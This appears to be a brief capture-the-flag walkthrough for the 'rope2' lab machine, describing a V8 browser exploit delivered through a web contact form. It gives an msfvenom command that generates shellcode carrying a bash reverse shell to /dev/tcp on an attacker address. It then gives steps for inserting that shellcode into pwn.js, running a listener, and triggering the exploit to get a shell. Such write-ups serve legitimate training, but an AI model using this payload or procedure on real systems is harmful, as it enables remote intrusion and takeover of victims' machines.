#generate the shell
> msfvenom -p linux/x64/exec -f num CMD='bash -c "bash -i >& /dev/tcp/10.10.xx.xx/9001 0>&1"'

#replace the your generated shellcode with the shellcode in pwn.js [line: 94]

#start python http server on port 8080 and use netcat to listner on selected port 9001

#Ahead over to http://10.10.10.196:8000/contact

type anything in name and subject but paste the contents of index.html in message box, click on send
if everything works, you should gave a shell as chromeuser

for those who want to know what's going on
https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/

v8 used in rope2 box is exactly compiled the with same patch as show in blog, but later pointer compression was added the exploit shown in blog works no more, tweaking exploit little bit should work.
